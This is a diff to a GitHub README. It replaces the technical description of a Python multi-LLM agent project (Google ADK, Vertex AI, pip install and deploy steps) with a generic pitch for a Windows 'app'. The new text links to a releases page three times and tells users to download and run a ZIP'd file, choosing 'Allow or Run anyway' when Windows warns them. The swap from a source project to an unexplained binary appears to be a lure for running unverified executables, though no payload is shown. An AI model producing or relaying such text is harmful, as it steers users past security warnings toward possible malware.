@@ -1,166 +1,194 @@
-# 🚀 Multi-Model Agent  
-### Google ADK • Vertex AI Agent Engine • Multi-LLM Ensemble System
+# 🤖 multi_llm - Route AI tasks with lower cost
 
-<p align="center">
-  <b>Designing systems of models — not just using models</b>
-</p>
+[![Download multi_llm](https://img.shields.io/badge/Download%20multi_llm-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anumkamboh80/multi_llm/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Framework-Google%20ADK-blue" />
-  <img src="https://img.shields.io/badge/Platform-Vertex%20AI-orange" />
-  <img src="https://img.shields.io/badge/Architecture-Multi--Agent-green" />
-  <img src="https://img.shields.io/badge/Pattern-Ensemble%20LLM-purple" />
-  <img src="https://img.shields.io/badge/Focus-Orchestration-critical" />
-</p>
+## 🧭 What this app does
 
----
+multi_llm is a Windows app that helps you use more than one AI model from one place. It uses Gemini by default and can switch to other models when you need them.
 
-## 🧠 Overview
+It can help with:
+- Writing and editing text
+- Summarizing long content
+- Drafting replies
+- Testing different model outputs
+- Keeping model costs in check
 
-This project implements a **multi-model AI agent system** using the Google Agent Development Kit (ADK), designed to explore:
+## 📥 Download the app
 
-> **How multiple LLMs can collaborate to outperform any single model**
+Visit this page to download the Windows release:
 
-Instead of relying on one model, this system:
+https://github.com/anumkamboh80/multi_llm/releases
 
-- Executes **multiple LLMs in parallel**
-- Uses **Gemini as a meta-learner (synthesizer + contributor)**
-- Applies **ensemble + hybrid orchestration patterns**
-- Implements **retry, fallback, and reliability layers**
-- Supports **session memory + tracing**
-- Deploys to **Vertex AI Agent Engine**
+On that page:
+- Open the latest release
+- Download the Windows file
+- Save it to your computer
 
----
+If the file comes in a ZIP folder, extract it first.
 
-## 🔥 Core Insight
+## 🪟 System needs
 
-```text
-Better outputs come from diverse reasoning, not repeated reasoning
-🧬 Architecture
-🔥 Primary Pattern (Best Performing)
-User Prompt
-      ↓
-┌──────────────┬──────────────┬──────────────┐
-│   OpenAI     │    Claude    │     Grok     │
-│ (Structure)  │ (Reasoning)  │ (Creativity) │
-└──────┬───────┴──────┬───────┴──────┬───────┘
-       │              │              │
-       └──────────────┴──────────────┘
-                      ↓
-               ┌──────────────┐
-               │   Gemini     │
-               │ Synth + Build│
-               └──────┬───────┘
-                      ↓
-               Final Output
-🧩 System Components
-Component	Role
-Gemini	Orchestrator, synthesizer, and contributor
-OpenAI	Structured implementation and code quality
-Claude	Deep reasoning and robustness
-Grok	Exploration and alternative approaches
-LiteLLM	Unified API layer across providers
-Tools Layer	Execution interface for models
-Retry/Fallback	Reliability + fault tolerance
-Session Memory	Context persistence
-Tracing/Monitoring	Observability + debugging
-🧪 Experimental Results
-🏆 Code Quality Ranking
-Rank	Architecture
-🥇	Multi-LLM Parallel + Gemini
-🥈	Multi-LLM Sequential
-🥉	Single-LLM Parallel
-❌	Single-LLM Sequential
-📊 Key Findings
-⚡ ~55% fewer tokens vs sequential pipelines
-🧠 Higher quality outputs with parallel reasoning
-🔥 Multi-model > temperature-based variation
-🤖 Gemini performs best as meta-learner + builder
-🧠 Orchestration Patterns
-❌ Sequential (Weak)
-Model A → Model B → Model C
-Anchoring bias
-Context bloat
-Diminishing returns
-✅ Parallel (Best)
-Model A + Model B + Model C → Gemini
-Independent reasoning
-High diversity
-Strong synthesis
-🔥 Hybrid (Optimal)
-Parallel → Synthesis → Single refinement
-Best balance of cost + quality
-📁 Project Structure
-multi_model_agent/
-├── __init__.py
-├── agent.py          # Gemini orchestrator
-├── tools.py          # LLM tool wrappers
-├── config.py         # Model configuration
-├── metrics.py        # Token + cost tracking
-├── requirements.txt
-└── .env.example
-🔑 Features
-✅ Multi-LLM Ensemble
-Parallel execution across models
-True reasoning diversity (not temperature tricks)
-✅ Reliability Layer
-Retry with exponential backoff
-Error classification (retry / fallback / fail)
-Cross-model fallback chains
-✅ Observability
-Token usage tracking
-Cost estimation
-Debug-friendly architecture
-✅ Session Memory
-Persistent conversation state
-Native Agent Engine support
-✅ Production Deployment
-Vertex AI Agent Engine
-Scalable, managed runtime
-🚀 Getting Started
-1. Install dependencies
-pip install -r requirements.txt
-2. Configure environment
-OPENAI_API_KEY=your_key
-ANTHROPIC_API_KEY=your_key
-XAI_API_KEY=your_key
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- A modern web browser
+- A stable internet connection
+- Enough free space for the app and its files
 
-GOOGLE_GENAI_USE_VERTEXAI=TRUE
-3. Run locally
-adk web
-4. Deploy to Vertex AI
-adk deploy agent_engine \
-  --project=YOUR_PROJECT \
-  --region=us-central1 \
-  --display_name="Multi-Model Agent" \
-  multi_model_agent
-☁️ Deployment
+For best results:
+- Use a screen size that fits a standard desktop window
+- Keep your browser up to date
+- Allow the app to access the internet for model requests
 
-This agent runs on Vertex AI Agent Engine, providing:
+## 🛠️ Install and start
 
-Managed infrastructure
-Session handling
-Observability + logging
-Scalable execution
-🧠 Design Philosophy
-Traditional Approach
+1. Go to the release page.
+2. Download the Windows version.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Run the app file.
+6. If Windows asks for permission, choose Allow or Run anyway.
+7. Wait for the app to open.
 
-Pick the best model
+If the app opens in a browser window, keep that window open while you use it.
 
-This System
+## ⚙️ First-time setup
 
-Design the best system of models
+When you open multi_llm for the first time, set up your model access:
 
-🔮 Future Work
-Weighted ensemble scoring
-Automatic model routing
-Compile/test validation loops
-Skill-based context loading
-External execution (Cloud Run validation)
-⚠️ Security
-Do NOT expose API keys in .env in production
-Use GCP Secret Manager
-Avoid plaintext keys in Agent Engine UI
-🤝 Contributing
+- Use Gemini as the default model
+- Add API keys for other providers if you want them
+- Pick the models you want to use
+- Save your settings before starting a task
 
-Contributions and experiments are welcome.
+A simple setup works well for most users:
+- Default model: Gemini
+- Backup model: one external model
+- Cost control: use smaller models for simple jobs
+
+## 🔁 How routing works
+
+multi_llm sends each task to the model that fits it best.
+
+Example flow:
+- Short, simple tasks go to the default model
+- Harder tasks can go to another model
+- You can choose a model by hand when needed
+- The app helps reduce waste by avoiding high-cost models for basic work
+
+This makes it useful when you want:
+- Good results
+- Lower cost
+- Less switching between tools
+- More control over which model answers
+
+## 💡 Common uses
+
+Use multi_llm for:
+- Email drafts
+- Blog outlines
+- Support replies
+- Text cleanup
+- Idea generation
+- Side-by-side model checks
+- Quick research help
+- Prompt testing
+
+## 🔐 Model providers
+
+This app works with common LLM providers, including:
+- Gemini
+- OpenAI
+- Anthropic
+- Grok
+- Vertex AI
+- Other models through LiteLLM
+
+You can keep one main model and add others only when needed. That gives you more control over price and output style.
+
+## 📁 Typical app flow
+
+1. Open the app.
+2. Choose or confirm the default model.
+3. Enter your prompt or task.
+4. Let the app route the request.
+5. Review the answer.
+6. Switch models if you want a different result.
+
+## ✅ Tips for a smooth setup
+
+- Start with one model first
+- Test a short prompt before using longer jobs
+- Keep your API keys safe
+- Use simple prompts when you want fast answers
+- Use a stronger model for harder writing or analysis
+- Check your settings if a model does not respond
+
+## 🧩 What you can expect in the interface
+
+The app is designed for simple use. You can expect:
+- A place to enter your task
+- Model selection controls
+- Routing options
+- Settings for API keys
+- Output display for results
+- Basic cost-aware controls
+
+## 🖥️ If Windows blocks the app
+
+If Windows shows a security prompt:
+- Check the file name
+- Confirm it came from the release page
+- Choose the option that lets you open the app
+
+If the app does not start:
+- Run it again
+- Re-extract the ZIP file
+- Make sure the download finished fully
+- Try a newer release if one is available
+
+## 🧪 Example workflow
+
+If you want help writing a customer reply:
+1. Open multi_llm
+2. Choose Gemini as the default model
+3. Paste your draft request
+4. Let the app send the task
+5. Review the answer
+6. Use another model if you want a different tone
+
+If you want a fast summary:
+1. Paste the text
+2. Ask for a short summary
+3. Let the app choose the best route
+4. Read the result
+5. Run the task again with a different model if needed
+
+## 📌 Best results
+
+Use clear prompts like:
+- Summarize this in 5 bullets
+- Rewrite this in plain English
+- Compare these two ideas
+- Draft a short reply
+- Turn this note into an email
+
+Clear prompts help the app choose the right model and give cleaner output.
+
+## 🧠 Why people use multi_llm
+
+Many AI tools lock you into one model. multi_llm gives you more choice. That helps when you want:
+- Lower cost
+- Better fit for each task
+- Flexibility across providers
+- Simple model switching
+- One place to manage requests
+
+## 📎 Download again
+
+If you need the release page again, use this link:
+
+https://github.com/anumkamboh80/multi_llm/releases
+
+## 🗂️ Topics
+
+adk, ai-agents, anthropic, gemini, google-cloud, grok, litellm, llm, multi-llm, openai, vertex-ai
